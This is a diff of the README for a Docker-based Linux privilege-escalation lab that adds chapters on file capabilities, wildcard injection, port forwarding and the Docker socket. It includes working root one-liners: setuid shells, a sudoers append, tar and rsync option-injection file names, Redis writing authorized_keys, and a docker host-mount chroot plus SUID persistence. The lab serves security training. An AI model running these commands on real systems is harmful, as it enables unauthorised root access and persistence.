@@ -2,7 +2,7 @@
 
 <p align="center">
   <strong>Hands-on Linux privilege-escalation labs in Docker — where you <em>actually</em> get root.</strong><br/>
-  <sub>5 chapters live · 18 privesc paths + 6 web-RCE routes · every exploit CI-verified end-to-end · every bug paired with the blue-team fix.</sub>
+  <sub>9 chapters live · 32 privesc paths + 6 web-RCE routes · every exploit CI-verified end-to-end · every bug paired with the blue-team fix.</sub>
 </p>
 
 <p align="center">
@@ -10,8 +10,8 @@
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-yellow.svg" alt="License: MIT"></a>
   <img src="https://img.shields.io/badge/platform-Docker-2496ED?logo=docker&logoColor=white" alt="Docker">
   <img src="https://img.shields.io/badge/focus-Linux%20privesc-444?logo=linux&logoColor=white" alt="Linux privesc">
-  <img src="https://img.shields.io/badge/labs-5%20live%20%C2%B7%203%20planned-success" alt="Labs: 5 live, 3 planned">
-  <img src="https://img.shields.io/badge/stations-18%20paths%20%2B%206%20web%20routes-success" alt="18 paths + 6 web routes">
+  <img src="https://img.shields.io/badge/labs-9%20live-success" alt="Labs: 9 live">
+  <img src="https://img.shields.io/badge/stations-32%20paths%20%2B%206%20web%20routes-success" alt="32 paths + 6 web routes">
   <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs welcome">
 </p>
 
@@ -56,19 +56,23 @@ Stuck? The chapter READMEs have hints with increasing detail; the [wiki](https:/
 ## 🗺️ What you'll learn
 
 - **Enumerate a box in four commands.** `sudo -l`, `find / -perm -4000`, the crontab, and `echo "$PATH"` — and read each result to know which hit opens which lab.
-- **Four classes of privesc, 18 paths to root.** SUID bits, cron trust, sudo rules, and PATH hijacking — each chapter has several independent routes, so failing one never ends the box.
+- **Eight classes of privesc, 32 paths to root.** SUID bits, cron trust, sudo rules, PATH hijacking, file capabilities, wildcard injection, loopback-service pivoting, and the Docker socket — each chapter has several independent routes, so failing one never ends the box.
 - **The one question under all of them.** *What does root touch that I can write?* — a file it reads, a directory it writes into, a config it sources, a command it calls by bare name. Answer it fast on any Linux host.
 - **Fix every path, not just break it.** The blue-team `find`/`grep`/`auditd` one-liner and the exact permission change that kills each bug.
 
-You land as `labuser1` (uid 1001) — not root. Four questions map the box, and each one points at a chapter:
+You land as `labuser1` (uid 1001) — not root. A handful of questions map the box, and each one points at a chapter:
 
 ```text
 labuser1 — uid 1001, not root
 │
-├── sudo -l              →  a NOPASSWD rule          →  Chapter 03 · Sudo  (5 paths)
-├── find / -perm -4000   →  an odd SUID binary       →  Chapter 01 · SUID  (5 paths)
-├── crontab + timers     →  a timed root job         →  Chapter 02 · Cron  (5 paths)
-└── echo "$PATH"         →  a writable dir on PATH    →  Chapter 04 · PATH  (3 new)
+├── sudo -l              →  a NOPASSWD rule          →  Chapter 03 · Sudo       (5 paths)
+├── find / -perm -4000   →  an odd SUID binary       →  Chapter 01 · SUID       (5 paths)
+├── getcap -r /          →  a capability on a file   →  Chapter 05 · Caps       (5 paths)
+├── crontab + timers     →  a timed root job …       →  Chapter 02 · Cron       (5 paths)
+│                           … that globs a `*`       →  Chapter 06 · Wildcard   (4 paths)
+├── echo "$PATH"         →  a writable dir on PATH   →  Chapter 04 · PATH       (3 new)
+├── ss -tlnp             →  a loopback service       →  Chapter 07 · Port fwd   (2 paths)
+└── id | grep docker     →  the docker group         →  Chapter 08 · Docker     (3 paths)
 
         exploit any one path  →  cat /root/flag.txt  →  R2R{…}
 ```
@@ -81,13 +85,13 @@ labuser1 — uid 1001, not root
 | 02 | **[Cron Jobs](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-02-Overview)** | `target-cron` (`hollow-backup-01`) | Root's timers trust the wrong things | ★☆☆☆ → ★★★☆ | ✅ Ready |
 | 03 | **[Sudo Rules](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-03-Overview)** | `target-sudo` (`hollow-dmz-01`) | Dangerous `sudoers` entries | ★☆☆☆ → ★★★☆ | ✅ Ready |
 | 04 | **[PATH Hijacking](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-04-Overview)** | `target-path` (`hollow-ops-01`) | Root calls a command by name, and a writable directory is searched first | ★★☆☆ | ✅ Ready |
-| 05 | Capabilities | — | `cap_setuid` on a binary | ★★★☆ | ⏳ Planned |
-| 06 | Writable `/etc/passwd` | — | Weak file permissions | ★☆☆☆ | ⏳ Planned |
-| 07 | NFS `no_root_squash` | — | Exported share mounts as root | ★★★☆ | ⏳ Planned |
-| 08 | Docker socket | — | `/var/run/docker.sock` exposed | ★★★☆ | ⏳ Planned |
+| 05 | **[Capabilities](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-05-Overview)** | `target-caps` (`hollow-vault-01`) | A binary carries a file capability instead of the SUID bit | ★★★☆ | ✅ Ready |
+| 06 | **[Wildcard Expansion](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-06-Overview)** | `target-wild` (`hollow-archive-01`) | Root's `*` jobs let a filename become a command-line option | ★★☆☆ → ★★★☆ | ✅ Ready |
+| 07 | **[Local Service + Port Forwarding](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-07-Overview)** | `target-pivot` (`hollow-relay-01`) | A loopback-only root service, reached through an SSH tunnel | ★★★☆ | ✅ Ready |
+| 08 | **[Docker socket](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-08-Overview)** | `target-docker` (`hollow-forge-01`) | The `docker` group / `docker.sock` is root-equivalent | ★★★☆ | ✅ Ready |
 | 09 | **[Foothold — Web RCE](https://github.com/Adw0rm-sec/road-to-root/wiki/Chapter-09-Overview)** | `target-web` (`hollow-portal-01`) | Vulnerable web app → RCE → reverse shell → root | ★☆☆☆ → ★★★☆ | ✅ Ready |
 
-### The paths in the four live chapters
+### The paths in every chapter
 
 <details open>
 <summary><strong>Chapter 01 — SUID Bits</strong>  ·  5 paths  ·  ★☆☆☆ → ★★★☆</summary>
@@ -134,6 +138,52 @@ labuser1 — uid 1001, not root
 </details>
 
 <details open>
+<summary><strong>Chapter 05 — Capabilities</strong>  ·  5 paths  ·  ★★★☆</summary>
+
+No SUID bits — `getcap -r /` is the surface.
+
+- **A · `cap_setuid` on python3** — `pyvault -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+- **B · `cap_setuid` on perl** — `plvault -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'`
+- **C · `cap_dac_read_search` on tar** — archive `/root/flag.txt` and extract it; read the flag with **no shell**
+- **D · `cap_dac_override` on a writer** — append a NOPASSWD rule to `/etc/sudoers`, then `sudo`
+- **E · `cap_setuid` on a bespoke launcher** — it `setuid(0)`s then runs `$SVC_CMD`; set it to a shell
+
+</details>
+
+<details open>
+<summary><strong>Chapter 06 — Wildcard Expansion</strong>  ·  4 paths  ·  ★★☆☆ → ★★★☆</summary>
+
+Root's cron jobs end in an unquoted `*`; a filename becomes an option.
+
+- **A · tar `--checkpoint-action`** — `touch -- '--checkpoint-action=exec=sh runme.sh'` in the archived dir → RCE
+- **B · rsync `-e`** — `touch -- '-e sh payload.sh'`; rsync runs it as the remote shell → RCE
+- **C · chown `--reference`** — a sticky drop dir; `--reference=ref` flips a root script to you → edit → root
+- **D · chmod `--reference`** — same, but `--reference=ww` (0666) opens a root script's mode → edit → root
+
+</details>
+
+<details open>
+<summary><strong>Chapter 07 — Local Service + Port Forwarding</strong>  ·  2 paths  ·  ★★★☆</summary>
+
+The win is a loopback-only root service; tunnel to it.
+
+- **A · local forward (`-L`)** — `ssh -L 6379:127.0.0.1:6379` to a root Redis → write `/root/.ssh/authorized_keys` → `ssh root@`
+- **B · remote forward (`-R`)** — a root updater fetches `http://127.0.0.1:9000/`; `ssh -R` publishes your payload server there → root runs it
+
+</details>
+
+<details open>
+<summary><strong>Chapter 08 — Docker socket</strong>  ·  3 paths  ·  ★★★☆</summary>
+
+`labuser1` is in the `docker` group — that is root with extra steps.
+
+- **A · mount + chroot** — `docker run -v /:/host rtr/bb chroot /host cat /root/flag.txt`
+- **B · persistence** — same mount, write a SUID root `bash` (or your SSH key) onto the host
+- **C · raw socket API** — do it with `curl --unix-socket /var/run/docker.sock`, no `docker` client at all
+
+</details>
+
+<details open>
 <summary><strong>Chapter 09 — Foothold (Web RCE)</strong>  ·  6 RCE routes → root  ·  ★☆☆☆ → ★★★☆</summary>
 
 The one chapter that starts you **outside** — no shell, just a browser and Burp against the "Hollow Share" portal (`http://127.0.0.1:8080/`). Every route lands a reverse shell as `www-data`; then `sudo php` finishes the climb to root.
@@ -157,11 +207,15 @@ Every one of these has a dedicated wiki page with the exploit flag-by-flag, the 
 ## 🖥️ Running each chapter
 
 ```bash
-make up                 # Chapter 01 (SUID)   attacker + target-suid
-make up-cron            # Chapter 02 (Cron)   attacker + target-cron
-make up-sudo            # Chapter 03 (Sudo)   attacker + target-sudo
-make up-path            # Chapter 04 (PATH)   attacker + target-path
-make up-web             # Chapter 09 (Web)    attacker + target-web  →  http://127.0.0.1:8080/
+make up                 # Chapter 01 (SUID)         attacker + target-suid
+make up-cron            # Chapter 02 (Cron)         attacker + target-cron
+make up-sudo            # Chapter 03 (Sudo)         attacker + target-sudo
+make up-path            # Chapter 04 (PATH)         attacker + target-path
+make up-caps            # Chapter 05 (Capabilities) attacker + target-caps
+make up-wild            # Chapter 06 (Wildcard)     attacker + target-wild
+make up-pivot           # Chapter 07 (Port fwd)     attacker + target-pivot
+make up-docker          # Chapter 08 (Docker sock)  attacker + target-docker
+make up-web             # Chapter 09 (Web)          attacker + target-web  →  http://127.0.0.1:8080/
 
 make attacker           # shell into the attacker box (all chapters)
 make shell-<chapter>    # root shell on the target (inspect / reset)
